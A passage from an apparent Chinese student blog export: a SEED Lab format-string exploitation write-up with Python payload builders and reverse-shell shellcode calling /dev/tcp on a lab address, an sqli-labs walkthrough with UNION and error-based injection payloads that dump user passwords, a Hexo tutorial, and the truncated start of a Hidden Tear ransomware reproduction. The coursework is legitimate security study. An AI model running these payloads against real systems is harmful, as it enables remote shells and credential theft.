<li>将shellcode放在数组最后，shellcode的起始地址为：$0xffffd430 + 1364=0xffffD984$，将返回地址修改为shellcode的起始地址<ul>
<li>$0xffff-0x204=65019$，将<code>%.8x</code>变为<code>%.65027x</code></li>
<li>$0x1D984-0xffff=55685$，添加<code>%.55685x</code></li>
<li>可以使用<code>build_string.py</code>文件来检测计算值</li>
</ul>
</li>
<li>执行<code>&quot;/bin/ls -l; echo &#39;===== Success! ======&#39;                  *&quot;</code>命令</li>
</ul>
<p><img src="/2021/12/01/SEED_lab4/image-20211201203616634.png" alt="image-20211201203616634"></p>
<h4 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell."></a>Getting a Reverse Shell.</h4><p>为了创建反向shell，我们更改shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>成功得到root</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201210231773.png" alt="image-20211201210231773"></p>
<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击<code>10.9.0.6</code>服务器的64-bit版本的<code>format</code>程序。</p>
<p>先发送一个hello给服务器，查看正常返回。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211201210954291.png" alt="image-20211201210954291"></p>
<p>可以看到帧指针和缓冲区地址的值长为8个字节（而不是32位程序中的4个字节）</p>
<p>我们的任务是构建payload以利用服务器的格式字符串漏洞，最终目标是在目标服务器上获取一个root shell。需要使用ShellCode的64位版本。</p>
<h3 id="Challenges-caused-by-64-bit-Address"><a href="#Challenges-caused-by-64-bit-Address" class="headerlink" title="Challenges caused by 64-bit Address."></a>Challenges caused by 64-bit Address.</h3><p><code>x64</code>架构引起的一个挑战是地址中的零。虽然<code>x64</code>架构支持64位地址空间，但只允许从0x00到0x00007fffffffff的地址。</p>
<p>这意味着对于每个地址(8字节)，最高的两个字节总是零。这就产生了一个问题</p>
<p>在这种攻击中，我们需要将地址放在格式字符串中。对于32位程序，我们可以把地址放在任何地方，因为地址里面没有零。我们不能再为64位程序这样做了。</p>
<p>如果在格式字符串中间放置一个地址，当<code>printf()</code>解析格式字符串时，当它看到一个零时，它将停止解析。格式字符串中第一个零之后的任何内容都不会被认为是格式字符串的一部分。</p>
<p>与缓冲区溢出攻击不同，在缓冲区溢出攻击中，如果使用strpcy()， 0将终止内存复制。</p>
<p>这里，程序中没有内存复制，所以我们可以在输入中有0，但将它们放在哪里是关键。</p>
<h3 id="A-userful-technique-moving-the-argument-pointer-freely"><a href="#A-userful-technique-moving-the-argument-pointer-freely" class="headerlink" title="A userful technique: moving the argument pointer freely"></a>A userful technique: moving the argument pointer freely</h3><p>在格式字符串中，我们可以使用<code>%x</code>将参数指针<code>va_list</code>移动到下一个可选参数。我们也可以直接将指针移动到第k个可选参数。</p>
<p>这是使用格式字符串的参数字段(以<code>k$</code>的形式)完成的。</p>
<p>下面的代码示例使用<code>%3$.20x</code>打印第三个可选参数的值3（前面填19个0），然后使用<code>%6$n</code>将一个值写入第6个可选参数（变量var，其值将变为20）。最后，使用<code>%2$.10x</code>时，它将指针移回第二个可选参数，并将其打印出来（2，前面填9个0）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> var = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$.20x%6$n%2$.10x\n&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, &amp;var);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The value in var: %d\n&quot;</span>,var);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">----- Output ------</span><br><span class="line">seed@ubuntu:$ a.out</span><br><span class="line"><span class="number">000000000000000000030000000002</span></span><br><span class="line">The value in var: <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>可以看到，使用这个方法，我们可以自由地来回移动指针。这种技术对于简化该任务中格式字符串的构造非常有用。</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>这个64位程序的攻击不同于32位，攻击的地址高位为0会被printf函数截断，所以只能将地址放在规格字符串最后，而且只能有一个地址会被printf函数解析。</p>
<p>并且有一个很重要的问题，因为之前的地址是放在content数组的首地址，所以，我们不用考虑对齐的问题，现在，地址放在字符串最末的位置，那么在地址之前的规格字符串都会影响地址的储存位置。</p>
<p>这个问题我们用说明书里给出的<code>k$</code>来解决，通过改变k的大小来改变<code>va_list</code>指针的指向，然后将地址放在content[320:328]的位置，固定间隔。</p>
<h4 id="secret-message的值"><a href="#secret-message的值" class="headerlink" title="secret message的值"></a>secret message的值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%38$.16lx\n&quot;</span> + <span class="string">&quot;%38$s.\n&quot;</span> <span class="comment"># &quot;%6$#.8x&quot; + &quot;%s&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">32</span>-<span class="built_in">len</span>(fmt)</span><br><span class="line">content[offset:offset+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x0000555555556008</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt):offset+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><code>va_list</code>第38个指向是secret的地址，然后<code>%38$s</code>输出地址存储的字符串。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202101105944.png" alt="image-20211202101105944"></p>
<h4 id="target-改变值"><a href="#target-改变值" class="headerlink" title="target 改变值"></a>target 改变值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%38$.16lx\n&quot;</span> + <span class="string">&quot;%38$ln\n&quot;</span> <span class="comment"># &quot;%6$#.8x&quot; + &quot;%s&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">32</span>-<span class="built_in">len</span>(fmt)</span><br><span class="line">content[offset:offset+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x0000555555558010</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt):offset+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><code>%38$.16lx</code>确认是否指向target地址</p>
<p><code>%38$ln</code>修改target的值。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202101227236.png" alt="image-20211202101227236"></p>
<h4 id="修改返回地址执行shellcode"><a href="#修改返回地址执行shellcode" class="headerlink" title="修改返回地址执行shellcode"></a>修改返回地址执行shellcode</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">8</span>              <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">buffer = <span class="number">0x00007fffffffe580</span> <span class="comment"># buffer地址</span></span><br><span class="line">ebp = <span class="number">0x00007fffffffe5b0</span>    <span class="comment"># myprintf的ebp值</span></span><br><span class="line">num1 = buffer &amp; (<span class="number">0x000000000000ffff</span>)</span><br><span class="line">num2 = <span class="number">0xffff</span></span><br><span class="line">num3 = <span class="number">0x7fff</span></span><br><span class="line">num4 = <span class="number">0x0000</span></span><br><span class="line"><span class="comment"># 可以直接修改buffer和ebp之后攻击，243是offset +1，后面 -2是因为前面有两个&#x27;\n&#x27;字符</span></span><br><span class="line">s = <span class="string">&quot;%74$.&quot;</span>+ <span class="built_in">str</span>(num1-<span class="number">243</span>)+<span class="string">&quot;lx\n&quot;</span> + <span class="string">&quot;%74$hn\n&quot;</span> + <span class="string">&quot;%75$.&quot;</span>+ <span class="built_in">str</span>(num2-num1-<span class="number">2</span>)+ <span class="string">&quot;x\n&quot;</span> + <span class="string">&quot;%75$hn\n&quot;</span> +<span class="string">&quot;%76$.32766lx\n&quot;</span> + <span class="string">&quot;%76$hn\n&quot;</span> +<span class="string">&quot;%77$.32767lx\n&quot;</span> + <span class="string">&quot;%77$hn\n&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset=<span class="number">320</span>-<span class="built_in">len</span>(fmt)</span><br><span class="line"><span class="built_in">print</span>(offset+<span class="number">1</span>) <span class="comment"># num1 - offset +1</span></span><br><span class="line">content[offset:offset+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"><span class="comment"># target地址0x0000555555558010，代替number查看修改的值，用来调试</span></span><br><span class="line">number  =  ebp + <span class="number">0x8</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt):offset+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number2 = number + <span class="number">2</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt)+<span class="number">8</span>:offset+<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number2).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number3 = number2 + <span class="number">2</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt)+<span class="number">16</span>:offset+<span class="built_in">len</span>(fmt)+<span class="number">24</span>]  =  (number3).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number4 = number3 + <span class="number">2</span></span><br><span class="line">content[offset+<span class="built_in">len</span>(fmt)+<span class="number">24</span>:offset+<span class="built_in">len</span>(fmt)+<span class="number">32</span>]  =  (number4).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>我这里是将shellcode放在最开始的位置，其实像32位一样放在后面也行，因为我之前理解错了，以为高位00会截断shellcode的接收。</p>
<p>将8字节的return address分割为4个2字节分别修改，值为shellcode的起始地址</p>
<p>因为服务器会完整地接收我们提供的1500个字节的输入，我们给出的4个地址其实也会保存在buffer栈中。</p>
<p>虽然<code>printf</code>函数面对00会停止解析，也就是<code>va_list</code>指针停止移动，但是我们还可以用<code>k$</code>去手动移动<code>va_list</code>指针，依次改变四个部分。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202153623852.png" alt="image-20211202153623852"></p>
<h4 id="创建反向shell"><a href="#创建反向shell" class="headerlink" title="创建反向shell"></a>创建反向shell</h4><p><img src="/2021/12/01/SEED_lab4/image-20211202153803684.png" alt="image-20211202153803684"></p>
<h2 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h2><p>还记得gcc编译器生成的警告消息吗？请解释一下它的意思。</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202232000200.png" alt="image-20211202232000200"></p>
<p>警告的意思是：将一个非常量作为format string，且没有格式化参数。</p>
<p>请修复服务器程序中的漏洞，并重新编译。</p>
<p>要解决这个warning，要将<code>printf(msg)</code> 改成 <code>printf(&quot;%s&quot;, msg)</code></p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202232134575.png" alt="image-20211202232134575"></p>
<p>编译器警告消失</p>
<p>尝试更改32位程序的target值，更改失败</p>
<p><img src="/2021/12/01/SEED_lab4/image-20211202233009036.png" alt="image-20211202233009036"></p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-lab靶场</title>
    <url>/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="Sqli-lab靶场"><a href="#Sqli-lab靶场" class="headerlink" title="Sqli-lab靶场"></a>Sqli-lab靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过win10 docker搭建，80端口映射到本机的8888端口。</p>
<p>通过这个靶场可以系统学习sqli</p>
<h2 id="Basic-Chanlleges"><a href="#Basic-Chanlleges" class="headerlink" title="Basic Chanlleges"></a>Basic Chanlleges</h2><p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025130228841-16351381501851.png" alt="image-20211025130228841"></p>
<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>GET传参-基于报错-单引号-字符串</p>
<p><code>?id=1</code>有两个回显，存在注入点</p>
<p><code>?id=1&#39;</code>出现报错，是<code>MySQL</code>报错，我们该学习如何去看报错<br><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025153901539.png" alt="image-20211025153901539"></p>
<p>在上图的near后面是<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，我们去掉左右两个引号出错的的地方是<code>&#39;1&#39;&#39; LIMIT 0,1</code>，只有三个<code>&#39;</code>，所以语法错误。</p>
<p>union 联合查询，将两个select语句的查询结果一起返回，回显到我们的页面。</p>
<p>但是需要注意的是，两个select的列数要一样，才能回显。</p>
<p><code>?id=&#39; union select 1,2,3--+</code>，不仅可以得到列数，还可以得到回显的位置</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162213822.png" alt="image-20211025162213822"></p>
<p>所以2,3都是回显的位置，所以接下来可以使用hackbar的一些语句去获得mysql的数据了。</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162502494.png" alt="image-20211025162502494"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+</span><br></pre></td></tr></table></figure>

<p>0x3c62723e是<code>&lt;br&gt;</code>的hex编码。</p>
<p>将表名使用hex编码或者利用CHAR()函数，可以绕过单引号限制</p>
<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>GET传参-基于报错-基于整型</p>
<p>根据报错判断出id是一个整型的注入点，不需要闭合，接下来就和上一题一样</p>
<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>GET传参-基于报错-带括号的单引号</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025184518768.png" alt="image-20211025184518768"></p>
<p>根据报错判断闭合方式为<code>?id=1&#39;) </code>，其他同上</p>
<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>GET传参-基于报错-双引号</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025185000471.png" alt="image-20211025185000471"></p>
<p>根据报错，闭合方式为<code>?id=1&quot;)</code>，其他同上</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>GET传参-二次注入-单引号-字符串</p>
<p>与前面的改变是select没有回显，也就是说不能使用union联合注入查询数据库信息。</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025190605757.png" alt="image-20211025190605757"></p>
<p>根据报错，与Less-1的闭合方式相同是<code>?id=1&#39;</code></p>
<p>这道题需要用的是报错注入，hackbar自己提供了一个基于extractvalue()函数的报错注入</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202543008.png" alt="image-20211025202543008"></p>
<p>成功报错得到数据库名</p>
<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202703212.png" alt="image-20211025202703212"></p>
<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>GET传参-二次注入-双引号-字符串</p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo写作——我的第一篇博客</title>
    <url>/2021/04/04/hexo%E5%86%99%E4%BD%9C%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>大体上建好了网站，现在我们来学习一下如何在<code>hexo</code>上写作，并同步你的第一篇文章到GitHub上</p>
</blockquote>
<h2 id="现在开始"><a href="#现在开始" class="headerlink" title="现在开始"></a>现在开始</h2><h3 id="创建一篇博客"><a href="#创建一篇博客" class="headerlink" title="创建一篇博客"></a>创建一篇博客</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new post &lt;My New Post&gt;</span><br></pre></td></tr></table></figure>

<p>如果不想使用命令行，直接在<code>source/_post</code>文件夹创建即可</p>
<p>需要注意的是，在文件编写的开头需要加上，<code>title</code>、<code>date</code>、<code>tag</code>、<code>category</code>、<code>author</code>、<code>Topping</code>这几个信息</p>
<h3 id="打开hexo服务器"><a href="#打开hexo服务器" class="headerlink" title="打开hexo服务器"></a>打开<code>hexo</code>服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>打开一个shell，输入这行命令</p>
<p>这是为了在本地观察渲染后的博客网站，显示一个<code>http://localhost:4000</code>网址，可以再这里观察网站变化</p>
<h3 id="生成静态网页"><a href="#生成静态网页" class="headerlink" title="生成静态网页"></a>生成静态网页</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate --watch</span><br></pre></td></tr></table></figure>

<p>打开另一个shell，输入命令·</p>
<p>如果不输入这行命令，网页是不会变化的，需要不断重复打开</p>
<p>输入命令后，我们可以刷新网页以更新变化，也可以在shell中看到网站的改变</p>
<h3 id="部署到GitHub仓库"><a href="#部署到GitHub仓库" class="headerlink" title="部署到GitHub仓库"></a>部署到GitHub仓库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<p>部署命令·，可能出错，如果出现<code>SSL Connection</code>错误，就是因为网络不好</p>
<p>再次输入部署命令就好了</p>
<h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p>为了实现插入图片，我们需要进行这几个操作：</p>
<ul>
<li><p>安装<code>hexo</code>插件：<code>npm install hexo-assert-image</code></p>
</li>
<li><p>将<code>node_modules</code>里面的<code>hexo-assert-image</code>文件夹的<code>index.js</code>和<code>pacage.json</code>替换为<a href="https://github.com/EricGerry/hexo-asset-image-0.0.5">github上的正确插件</a> 下的相同文件，就可以了。</p>
</li>
<li><p>修改配置文件<code>_config.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Typora</code>的偏好设置中，我们将图片存储到指定路径<code>./$&#123;filename&#125;</code></p>
</li>
<li><p>具体使用：随便粘贴一张图到文章中，即可正确显示在本地和网页。</p>
</li>
</ul>
<h2 id="使用过程中的问题"><a href="#使用过程中的问题" class="headerlink" title="使用过程中的问题"></a>使用过程中的问题</h2><h3 id="问题：title不能出现”-“字符"><a href="#问题：title不能出现”-“字符" class="headerlink" title="问题：title不能出现”: “字符"></a>问题：title不能出现”: “字符</h3><p><img src="/2021/04/04/hexo%E5%86%99%E4%BD%9C%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20211203215119693.png" alt="image-20211203215119693"> </p>
<h3 id="问题：不能使用搜索功能"><a href="#问题：不能使用搜索功能" class="headerlink" title="问题：不能使用搜索功能"></a>问题：不能使用搜索功能</h3><p><img src="/2021/04/04/hexo%E5%86%99%E4%BD%9C%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20211206183302190.png" alt="image-20211206183302190"></p>
<p>检查<code>public</code>下面的<code>search.xml</code>查看报错，vs code 打开报错的是哪篇博客，搜索<code>0x02</code>字符，删除或者换成截图。</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Hidden Tear 勒索病毒</title>
    <url>/2021/11/26/hidden_tear/</url>
    <content><![CDATA[<h1 id="Hidden-Tear-勒索病毒"><a href="#Hidden-Tear-勒索病毒" class="headerlink" title="Hidden Tear 勒索病毒"></a>Hidden Tear 勒索病毒</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：</p>
<p>这是一个类似勒索软件的文件加密器示例，我们可以针对特定目的对它进行修改。</p>
<p>特征：</p>
<ul>
<li>使用AES算法去加密文件</li>
<li>发送秘钥到服务器</li>
<li>被加密的文件可以在解密程序里用密钥解密</li>
<li>创建一个文本文件，给受害者一段信息</li>
<li>反病毒程序检测结果：<a href="http://nodistribute.com/result/6a4jDwi83Fzt">hidden-tear.exe | 12/23 | NoDistribute</a></li>
</ul>
<p>我们可以通过这个简单的病毒，去了解勒索病毒是如何工作的。</p>
<h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><p>Visual Studio 安装.NET 环境，打开<code>./hidden-tear/hidden-tear.sln</code>，对加密器进行定制。</p>
<ol>
<li><p>没有云服务器，我们用 Kali Linux 虚拟机作为web服务器，使用 phpstudy 搭建。</p>
</li>
